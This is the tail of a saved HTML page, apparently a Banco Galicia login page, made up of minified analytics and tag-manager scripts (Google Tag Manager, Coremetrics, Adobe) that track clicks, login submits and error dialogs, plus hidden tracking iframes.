<script type="text/javascript" id="" src="./index_files/Scripts/eluminate.js"></script><script type="text/javascript" id="">(function(){try{var a=document.location.pathname.toLowerCase();document.cookie=google_tag_manager["GTM-M6B9RZQ"].macro(45)==a?"onb2_isreload\x3dtrue; path\x3d/":"onb2_isreload\x3dfalse; path\x3d/";document.cookie="onb2_prevpath\x3d"+a+"; path\x3d/";try{sessionStorage.onb2_prereferrer=sessionStorage.onb2_referrer,sessionStorage.onb2_referrer=document.referrer}catch(b){}}catch(b){a=google_tag_manager["GTM-M6B9RZQ"].macro(47),a(b)}})();</script><script type="text/javascript" id="">(function(){function c(a){try{window.dataLayer.push({event:"uiInteraction",uiInteractionPlace:"Side menu",uiAction:a,uiText:a})}catch(b){}}try{$(".nav.nav-sidebar li a, .content-nav-bottom a.btn-caps").click(function(a){a=$(a.target);try{c(a.text().trim())}catch(b){a=google_tag_manager["GTM-M6B9RZQ"].macro(49),a(b)}}),$("a#UserName_a").click(function(a){try{c("Nombre")}catch(b){}})}catch(a){var d=google_tag_manager["GTM-M6B9RZQ"].macro(51);d(a)}})();</script><script type="text/javascript" id="">var google_conversion_id=936934836,google_custom_params=window.google_tag_params,google_remarketing_only=!0;</script>
<script type="text/javascript" id="" src="./index_files/f.txt"></script>
<script type="text/javascript" id="" src="./index_files/Scripts/launch-121f57795303.min.js"></script>
<script type="text/javascript" id="">(function(){try{0<$(".customer-effort").length&&($(".customer-effort .content-rating input").click(function(){try{var a=$(".customer-effort input[name\x3d'rating']:checked").val();window.dataLayer.push({event:"sendCustomerEffort",CEstars:a,CEaction:"Select"})}catch(b){a=google_tag_manager["GTM-M6B9RZQ"].macro(70),a(b)}}),$(".customer-effort button[id\x3d'sendComment']").click(function(){try{var a=$(".customer-effort input[name\x3d'rating']:checked").val(),b=$(".customer-effort .comment input").val();window.dataLayer.push({event:"sendCustomerEffort",
CEstars:a,CEaction:"Send",CEcomment:b})}catch(c){a=google_tag_manager["GTM-M6B9RZQ"].macro(72),a(c)}}))}catch(a){var d=google_tag_manager["GTM-M6B9RZQ"].macro(74);d(a)}})();</script><script type="text/javascript" id="">(function(){function sendUiInteraction(uiPlace,uiAction,uiLabel){try{window.dataLayer.push({"event":"uiInteraction","uiInteractionPlace":uiPlace,"uiAction":uiAction,"uiText":uiLabel})}catch(e){var efun=google_tag_manager["GTM-M6B9RZQ"].macro(76);efun(e)}}function sendOpEvent(eCategory,eAction,eLabel){try{window.dataLayer.push({"event":"operationEvent","eventCategory":eCategory,"eventAction":eAction,"eventLabel":eLabel})}catch(e){var efun=google_tag_manager["GTM-M6B9RZQ"].macro(78);efun(e)}}try{if(document.location.pathname.indexOf("seguridad/generar-usuario-clave")!=
-1)var loginplace="Generar Usuario o Clave";else if(document.location.pathname.indexOf("seguridad/recuperar-usuario-clave")!=-1)var loginplace="Recuperar Usuario o Clave";else if($(".login .reminder").length==1)var loginplace="Reminder Login";else if($(".login .reminder").length==0)var loginplace="Normal Login";else var loginplace="(not set)";$("a").click(function(e){try{var text=$(e.target).text().trim();if($(e.target).hasClass("logo")||$(e.target).parent().hasClass("logo"))text="Logo Galicia";if($(e.target).hasClass("icon-close")||
$(e.target).parent().hasClass("icon-close"))text="Icon Close";sendUiInteraction("Login",loginplace,text)}catch(e){var efun=google_tag_manager["GTM-M6B9RZQ"].macro(80);efun(e)}});$("form").submit(function(){try{sessionStorage.setItem("ddDni",$("#DocumentNumber").val());window.dataLayer.push({"event":"signIn","signInAction":"Login submit","signInLabel":loginplace})}catch(e){var efun=google_tag_manager["GTM-M6B9RZQ"].macro(82);efun(e)}})}catch(e){var efun=google_tag_manager["GTM-M6B9RZQ"].macro(84);efun(e)}})();</script><script type="text/javascript" id="">(function(){function k(a,d){try{var b=google_tag_manager["GTM-M6B9RZQ"].macro(87);d=b(d);b=google_tag_manager["GTM-M6B9RZQ"].macro(90);var c=b(a,d,"");0!=m(a,d)&&(d=m(a,d));window.dataLayer.push({event:"error",errorContext:c,errorTitle:a,errorPlace:document.location.pathname,errorMessage:d,errorCode:void 0})}catch(h){c=google_tag_manager["GTM-M6B9RZQ"].macro(92),c(h)}}function m(a,d){try{var b=a.toLowerCase(),c=d.toLowerCase(),h=[[-1!=b.indexOf("eliminar contacto")&&-1!=c.indexOf("quer\u00e9s eliminar"),"\u00bfDesea eliminar el contacto?"],[-1!=b.indexOf("cuenta proyecto")&&
-1!=c.indexOf("cerrar tu cuenta proyecto"),"\u00bfDesea cerrar la cuenta proyecto?"],[-1!=b.indexOf("eliminar celular")&&-1!=c.indexOf("deseas eliminar"),"\u00bfDesea eliminar el celular?"]];for(e=0;e<h.length;e++)if(h[e][0])return"ofuscado"+q+h[e][1];return!1}catch(l){b=google_tag_manager["GTM-M6B9RZQ"].macro(94),b(l)}}try{for(var q=" "+google_tag_manager["GTM-M6B9RZQ"].macro(95)+" ",n=window.MutationObserver||window.WebKitMutationObserver,p={attributes:!0,childList:!0,characterData:!0,subtree:!1},f=$("*[class*\x3d'modal'][role\x3d'dialog']"),
t=new n(function(a){try{for(var d=[],b=0;b<a.length;b++){var c=a[b],e=c.target.id+c.type+c.attributeName;if(-1==d.indexOf(e)&&"attributes"==c.type&&"style"==c.attributeName&&"block"==c.target.style.display){var f=$(c.target).find(".modal-header").text().trim(),g=$(c.target).find(".modal-body").text().trim();k(f,g)}d.push(e)}}catch(r){a=google_tag_manager["GTM-M6B9RZQ"].macro(97),a(r)}}),e=0;e<f.length;e++)try{if("block"==f[e].style.display){var u=$(f[e]).find(".modal-header").text().trim(),v=$(f[e]).find(".modal-body").text().trim();
k(u,v)}else t.observe(f[e],p)}catch(a){var g=google_tag_manager["GTM-M6B9RZQ"].macro(99);g(a)}var w=$("#mainModalContainer")[0],x=new n(function(a){try{for(var d=0;d<a.length;d++){var b=a[d];if("childList"==b.type&&0<b.addedNodes.length){var c=$(b.addedNodes[0]).find(".modal-header").text().trim(),e=$(b.addedNodes[0]).find(".modal-body").text().trim();k(c,e)}}}catch(l){a=google_tag_manager["GTM-M6B9RZQ"].macro(101),a(l)}});try{x.observe(w,p)}catch(a){g=google_tag_manager["GTM-M6B9RZQ"].macro(103),g(a)}}catch(a){g=google_tag_manager["GTM-M6B9RZQ"].macro(105),g(a)}})();</script><iframe name="_hjRemoteVarsFrame" title="_hjRemoteVarsFrame" id="_hjRemoteVarsFrame" src="./index_files/box-469cf41adb11dc78be68c1ae7f9457a4.html" style="display: none !important; width: 1px !important; height: 1px !important; opacity: 0 !important; pointer-events: none !important;"></iframe>
<script type="text/javascript" id="">try{cmSetClientID(google_tag_manager["GTM-M6B9RZQ"].macro(15),!0,"data.coremetrics.com",google_tag_manager["GTM-M6B9RZQ"].macro(20)),cmSetupOther({cm_JSFEAMasterIDSessionCookie:!0})}catch(a){var efun=google_tag_manager["GTM-M6B9RZQ"].macro(22);efun(a)};</script><script type="text/javascript" id="">try{cmCreatePageviewTag(document.location.pathname)}catch(a){var efun=google_tag_manager["GTM-M6B9RZQ"].macro(112);efun(a)};</script><script>_satellite["__runScript1"](function(event, target) {
window.__AAM = window.__AAM || [];    
function queue (arr, callback) {
    var lastQueueLength;
    var lastIndex = 0;
    
    function arrayListener () {
        if (!arr || !arr.length) {
            setTimeout(function () {
                arrayListener();
            }, 1000);
            return;
        }

        try {
            if (arr.length != lastQueueLength) {
                _satellite.logger.debug('Queue: lastLength: ' + lastQueueLength + ' current: ' + arr.length);
                lastQueueLength = arr.length;
                processQueue(arr.slice(), lastQueueLength);
            }
        } catch (error) {}

        setTimeout(function () {
            arrayListener(arr);
        }, 1000);
    }

    function processQueue (queuedArr, length) {
        _satellite.logger.debug('Processing from: ' + lastIndex + ' to: ' + length);
        for (var i = lastIndex; i < length; i++) {
            try {
                callback(queuedArr[i]);
            } catch (e) {}
        }
        lastIndex = i;
        _satellite.logger.debug('Last index: ' + lastIndex);
    }

    arrayListener();
}
(new queue(dataLayer, function processData (evt) {
    if (!evt.event) {
        return;
    }
    switch (evt.event) {
        case 'gtm.dom':
            break;
        case 'gtmPageview':
            break;
        case 'gtm.load':
            break;
        case 'gtm.js':
            break;
        case 'gtm.elementVisibility':
            break;
        case 'gtm.scrollDepth':
            break;
        case 'impressions':
            break;
        default:
            // case 'outboundLink':  case 'authentication': case 'gtm.click':
            window.__AAM.push({ 'queue': evt });
            break;
    }
}));
});</script><script>_satellite["__runScript2"](function(event, target) {
window.__AAM = window.__AAM || [];
function queue (source, callback, lastQueueLength) {
    var lastIndex = 0;

    function wait () {
        setTimeout(function () {
            listener();
        }, 1000);
    }

    function listener () {
        arr = source();
        if (!arr || !arr.length) {
            wait();
            return;
        }

        try {
            if (arr.length != lastQueueLength) {
                _satellite.logger.debug('Queue: lastLength: ' + lastQueueLength + ' current: ' + arr.length);
                lastQueueLength = arr.length;
                callback();
            }
        } catch (error) {}

        wait();
    }

    listener();
}
(new queue(ga.getAll, function processData () {
    window.__AAM.push({ 'ga': true });
}, ga.getAll().length));

});</script><iframe sandbox="allow-scripts allow-same-origin" title="Adobe ID Syncing iFrame" id="destination_publishing_iframe_galiciabanco_0" name="destination_publishing_iframe_galiciabanco_0_name" src="./index_files/dest5.html" style="display: none; width: 0px; height: 0px;" class="aamIframeLoaded"></iframe></body></html>